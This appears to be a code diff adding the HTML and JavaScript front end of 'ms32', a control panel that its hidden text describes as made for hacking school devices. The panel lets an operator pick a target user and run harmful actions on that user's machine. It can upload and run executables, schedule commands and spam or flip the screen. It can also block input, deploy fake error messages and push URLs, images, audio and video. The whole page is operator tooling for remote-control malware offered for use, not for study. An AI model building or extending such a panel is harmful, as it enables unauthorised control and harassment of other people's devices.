@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ms32</title>
+  <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link rel="icon" href="/static/favicon.ico" type="image/x-icon">
+  <style></style>
+</head>
+
+<body>
+  <div class="progress-bar-container" style="display:none;">
+    <div class="progress-bar" id="progress-bar"></div>
+  </div>
+
+  <header>
+    <h1 style="display:none;">ms32-sha2</h1>
+  </header>
+
+  <div style="display:none;">
+    About the website: ms32 is a website designed for hacking school devices. This website is made by some professional hackers 👽.
+    <br> NOTE: If you open this website, your device will also be hacked, so open at your own risk.
+    <br> insta: https://www.instagram.com/_shakti.ladke_?igsh=eDBzZnpncDZ3a2Nr
+    <br> kisi ka baap se nahi darte 👽
+  </div>
+
+  <h2 class="site-heading"><pre>Project ms32</pre></h2>
+
+  <div class="home" id="home">
+    <div class="container">
+      <form action="/edit" method="POST" id="message-form">
+        <textarea placeholder="Type something..." class="text" name="text"></textarea>
+        <button class="btn" type="submit">Send</button>
+      </form>
+
+      <form action="/url" method="POST" id="url-form">
+        <input type="url" class="text" name="url" placeholder="Enter URL" required>
+        <button class="btn" type="submit">Open</button>
+      </form>
+    </div>
+
+    <div class="overlay-box" id="overlay-box">
+      <form action="/add-task" method="POST" id="task-form">
+        <textarea class="text" name="task" placeholder="Enter task description..." required></textarea>
+        <input type="datetime-local" class="datetime-input" name="task-datetime" required>
+        <button class="btn" type="submit">Add Task</button>
+      </form>
+    </div>
+
+    <div class="bottom-left-buttons">
+      <label for="file-input" class="choose-file-btn">Choose File</label>
+      <input type="file" id="file-input" class="file-input">
+      <button class="update-btn" id="update-btn">Update</button>
+    </div>
+
+    <div class="center-bottom-buttons">
+      <label for="center-file-input" class="btn">Choose File</label>
+      <input type="file" id="center-file-input" class="exe-input" style="display: none;">
+      <button class="btn" id="run-btn">Run</button>
+    </div>
+
+    <div class="status" id="status" style="color:{{color}};">{{state}}</div>
+
+    <div class="dropdown-container">
+      <label for="Dropdown" style="color:#238636">Select Target</label>
+      <select id="Dropdown" class="dropdown">
+        <option value="{{selected}}">{{selected}}</option>
+        {% for user in users %}
+          {% if user != selected %}
+            <option value="{{user}}">{{user}}</option>
+          {% endif %}
+        {% endfor %}
+      </select>
+    </div>
+
+    <div class="dropdown-container errcont">
+      <form id="errform">
+        <label for="Dropdown" style="color:#238636">Err no to deploy</label>
+        <input type="number" min="1" placeholder="Error num..." name="err" id="errinput"><br>
+        <button id="errbut" type="submit">Deploy error</button>
+      </form>
+    </div>
+
+    <div class="right-toggle-buttons">
+      <button id="hide-toggle" style="background-color:{{hc}}">Hide: {{hs}}</button>
+      <button id="spam-toggle" style="background-color:{{sc}}">Spam: {{ss}}</button>
+      <button id="flip-toggle" style="background-color:{{fc}}">Chaos: {{fs}}</button>
+      <button id="share-toggle" style="background-color:{{shc}}">Share: {{shs}}</button>
+      <button id="IN-toggle" style="background-color:{{ic}}">IN_Block: {{is1}}</button>
+    </div>
+
+    <div class="left-sidebar">
+      <div class="sidebar-header">Schedule Task</div>
+      <div class="sidebar-content">
+        {% for task in tasks["tasks"] %}
+        <div class="task-item">
+          <div class="task-details">
+            <span><span class="green-label">Task:</span> {{task["cmd"]}}</span>
+            <span><span class="green-label">Created On:</span> {{task["time"]}}</span>
+            <span><span class="green-label">Execution At:</span> {{task["execution_time"]}}</span>
+          </div>
+          <form action="/delete-task" method="POST" class="task-actions">
+            <input type="hidden" name="task-id" value="{{ task['id'] }}">
+            <button class="delete-btn"><i class="fas fa-trash-alt"></i></button>
+          </form>
+        </div>
+        {% endfor %}
+      </div>
+      <div class="bottom-fixed">
+        <button class="btn schedule-btn" id="add">Schedule</button>
+      </div>
+    </div>
+
+    <div class="bottom-right-buttons">
+      <label for="image-upload" class="upload-image-btn">Upload Img/Vid</label>
+      <input type="file" id="image-upload" class="file-input">
+      <button class="open-btn" id="open-btn">Open</button>
+    </div>
+
+    <div class="sidebar hidden" id="audio-sidebar">
+      <div class="sidebar-header">Audio Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for file in files %}
+          <div class="audio-item">
+            <span>{{file}}</span>
+            <form action="/play" method="POST" style="display:inline">
+              <input type="hidden" name="audio" value="{{ file }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+
+    <div id="img-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Image Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for img in images %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <img src="/static/images/{{ img }}" alt="Image" style="width: 50px; height: 50px; object-fit: cover; border-radius: 5px;">
+            <span>{{ img }}</span>
+            <form action="/img" method="POST" style="display:inline">
+              <input type="hidden" name="img" value="{{ img }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <div id="vid-sidebar" class="sidebar hidden">
+      <div class="sidebar-header">Video Files</div>
+      <div class="sidebar-content">
+        <div class="audio-list">
+          {% for vid in videos %}
+          <div class="audio-item" style="display: flex; align-items: center; gap: 10px;">
+            <span>{{ vid }}</span>
+            <form action="/vid" method="POST" style="display:inline">
+              <input type="hidden" name="vid" value="{{ vid }}">
+              <button class="play-btn"><i class="fas fa-play"></i></button>
+            </form>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+    </div>
+    <div class="right-switcher">
+      <button id="audio-btn"><i class="fa fa-music"></i></button>
+      <button id="img-btn"><i class="fas fa-image"></i></button>
+      <button id="vid-btn"><i class="fas fa-video"></i></button>
+    </div>
+  </div>
+<script>
+update();
+fetchButtonState();
+
+const audio_form = document.getElementById('audio-form');
+const audio = document.getElementById('audio-input');
+const updateBtn = document.getElementById('update-btn');
+const fileInput = document.getElementById('file-input');
+const imgInput = document.getElementById("image-upload");
+const openbtn = document.getElementById("open-btn");
+const dropdown = document.getElementById("Dropdown");
+const runbtn = document.getElementById("run-btn");
+const exeInput = document.getElementById("center-file-input");
+
+let isadded = false;
+let cmd;
+let state;
+
+dropdown.addEventListener("change", () => {
+  fetch("/change-user", {
+    method: "POST",
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ user: dropdown.value })
+  });
+  fetchButtonState()
+});
+
+async function fetchButtonState() {
+  try {
+    const response = await fetch('/static/state.json');
+    const data1 = await response.json();
+    const data = data1[dropdown.value]
+    console.log(data)
+    initializeToggleButton('hide-toggle', 'Hide', data.hideToggleState.state || 'off');
+    initializeToggleButton('spam-toggle', 'Spam', data.spamToggleState.state || 'off');
+    initializeToggleButton('flip-toggle', 'Chaos', data.flipToggleState.state || 'off');
+    initializeToggleButton('share-toggle', 'Share', data.shareToggleState.state || 'off');
+    initializeToggleButton('IN-toggle', 'IN_Block', data.INToggleState.state || 'off');
+  } catch (error) {
+    console.error('Error fetching button state:', error);
+  }
+}
+
+function initializeToggleButton(buttonId, defaultText, initialState) {
+  const button = document.getElementById(buttonId);
+
+  const newButton = button.cloneNode(true);
+  button.replaceWith(newButton);
+
+  const updatedButton = document.getElementById(buttonId);
+  
+  updatedButton.dataset.state = initialState;
+  updatedButton.style.backgroundColor = initialState === 'on' ? 'green' : 'red';
+  updatedButton.textContent = `${defaultText}: ${initialState === 'on' ? 'On' : 'Off'}`;
+
+  updatedButton.addEventListener('click', function () {
+    let cmd;
+    let state;
+
+    if (defaultText === "Hide") {
+      cmd = "hIdE";
+    } else if (defaultText === "Spam") {
+      cmd = "sPaM";
+    } else if (defaultText === "Chaos") {
+      cmd = "fLiP";
+    }else if (defaultText === "Share"){
+      cmd = "sHaRe"
+    }else if (defaultText === "IN_Block"){
+      cmd = "bLoCk"
+    }
+
+    if (updatedButton.dataset.state === 'on') {
+      updatedButton.dataset.state = 'off';
+      updatedButton.style.backgroundColor = 'red';
+      updatedButton.textContent = `${defaultText}: Off`;
+      state = "off";
+    } else {
+      updatedButton.dataset.state = 'on';
+      updatedButton.style.backgroundColor = 'green';
+      updatedButton.textContent = `${defaultText}: On`;
+      state = "on";
+    }
+
+    fetch("/toggle", {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ cmd: cmd, state: state })
+    });
+  });
+}
+
+  
+
+document.querySelector(".schedule-btn").addEventListener("click", () => {
+  const taskForm = document.getElementById("overlay-box");
+  taskForm.style.display = taskForm.style.display === "none" || taskForm.style.display === "" ? "block" : "none";
+});
+
+runbtn.addEventListener('click', function () {
+  const file = exeInput.files[0];
+  if (!file) {
+    alert("Please choose a file to upload.");
+    return;
+  }
+
+  const progressBarContainer = document.querySelector(".progress-bar-container");
+  const progressBar = document.getElementById("progress-bar");
+  progressBarContainer.style.display = "block";
+  progressBar.style.width = "0%";
+
+  const formData = new FormData();
+  formData.append('file', file);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', '/exe', true);
+  xhr.upload.addEventListener('progress', (event) => {
+    if (event.lengthComputable) {
+      const percentage = Math.round((event.loaded / event.total) * 100);
+      progressBar.style.width = `${percentage}%`;
+    }
+  });
+
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      const response = JSON.parse(xhr.responseText);
+      if (response.success) {
+        alert('File updated successfully!');
+        progressBarContainer.style.display = "none";
+      } else {
+        alert('File update failed!');
+      }
+    } else {
+      alert('An error occurred while uploading the file.');
+    }
+
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.onerror = () => {
+    alert('An error occurred during the upload.');
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.send(formData);
+});
+
+openbtn.addEventListener('click', function () {
+  const file = imgInput.files[0];
+  if (!file) {
+    alert("Please choose a file to upload.");
+    return;
+  }
+
+  const progressBarContainer = document.querySelector(".progress-bar-container");
+  const progressBar = document.getElementById("progress-bar");
+  progressBarContainer.style.display = "block";
+  progressBar.style.width = "0%";
+
+  const formData = new FormData();
+  formData.append('file', file);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', '/image', true);
+  xhr.upload.addEventListener('progress', (event) => {
+    if (event.lengthComputable) {
+      const percentage = Math.round((event.loaded / event.total) * 100);
+      progressBar.style.width = `${percentage}%`;
+    }
+  });
+
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      const response = JSON.parse(xhr.responseText);
+      if (response.success) {
+        alert('File updated successfully!');
+        progressBarContainer.style.display = "none";
+      } else {
+        alert('File update failed!');
+      }
+    } else {
+      alert('An error occurred while uploading the file.');
+    }
+
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.onerror = () => {
+    alert('An error occurred during the upload.');
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.send(formData);
+});
+
+updateBtn.addEventListener('click', function () {
+  const file = fileInput.files[0];
+  if (!file) {
+    alert("Please choose a file to upload.");
+    return;
+  }
+
+  const progressBarContainer = document.querySelector(".progress-bar-container");
+  const progressBar = document.getElementById("progress-bar");
+  progressBarContainer.style.display = "block";
+  progressBar.style.width = "0%";
+
+  const formData = new FormData();
+  formData.append('file', file);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', '/update', true);
+  xhr.upload.addEventListener('progress', (event) => {
+    if (event.lengthComputable) {
+      const percentage = Math.round((event.loaded / event.total) * 100);
+      progressBar.style.width = `${percentage}%`;
+    }
+  });
+
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      const response = JSON.parse(xhr.responseText);
+      if (response.success) {
+        alert('File updated successfully!');
+        progressBarContainer.style.display = "none";
+      } else {
+        alert('File update failed!');
+      }
+    } else {
+      alert('An error occurred while uploading the file.');
+    }
+
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.onerror = () => {
+    alert('An error occurred during the upload.');
+    progressBarContainer.style.display = "none";
+  };
+
+  xhr.send(formData);
+});
+
+async function update() {
+  try {
+    const response = await fetch("/status", { method: "GET" });
+
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+
+    const data = await response.text();
+    console.log('Status:', data);
+
+    const statusElement = document.getElementById("status");
+
+    if (data === "online") {
+      statusElement.style.color = "green";
+      statusElement.textContent = "Online";
+    } else if (data === "offline") {
+      statusElement.style.color = "red";
+      statusElement.textContent = "Offline";
+    } else {
+      statusElement.style.color = "orange";
+      statusElement.textContent = "Unknown Status";
+    }
+  } catch (error) {
+    console.error('Error in update function:', error);
+
+    const statusElement = document.getElementById("status");
+    statusElement.style.color = "orange";
+    statusElement.textContent = "Connection Error";
+  }
+}
+document.querySelector("#errform").addEventListener("submit",(e)=>{
+  e.preventDefault()
+  const form = e.target
+  const formData = new FormData(form)
+  fetch("/err",{
+    method:"POST",
+    body:formData
+  })
+  document.querySelector("#errform").reset()
+})
+
+setInterval(update, 1000);
+
+</script>
+  <script>
+    const audioBtn = document.getElementById("audio-btn");
+    const imgBtn = document.getElementById("img-btn");
+    const vidBtn = document.getElementById("vid-btn");
+    const audioSidebar = document.getElementById("audio-sidebar");
+    const imgSidebar = document.getElementById("img-sidebar");
+    const vidSidebar = document.getElementById("vid-sidebar");
+
+    function hideAllSidebars() {
+      audioSidebar.classList.add("hidden");
+      imgSidebar.classList.add("hidden");
+      vidSidebar.classList.add("hidden");
+      audioBtn.classList.remove("active");
+      imgBtn.classList.remove("active");
+      vidBtn.classList.remove("active");
+    }
+
+    audioBtn.addEventListener("click", () => {
+      if (audioSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        audioSidebar.classList.remove("hidden");
+        audioBtn.classList.add("active");
+      } else {
+        audioSidebar.classList.add("hidden");
+        audioBtn.classList.remove("active");
+      }
+    });
+
+    imgBtn.addEventListener("click", () => {
+      if (imgSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        imgSidebar.classList.remove("hidden");
+        imgBtn.classList.add("active");
+      } else {
+        imgSidebar.classList.add("hidden");
+        imgBtn.classList.remove("active");
+      }
+    });
+    vidBtn.addEventListener("click", () => {
+      if (vidSidebar.classList.contains("hidden")) {
+        hideAllSidebars();
+        vidSidebar.classList.remove("hidden");
+        vidBtn.classList.add("active");
+      } else {
+        vidSidebar.classList.add("hidden");
+        vidBtn.classList.remove("active");
+      }
+    });
+  </script>
+</body>
+</html>
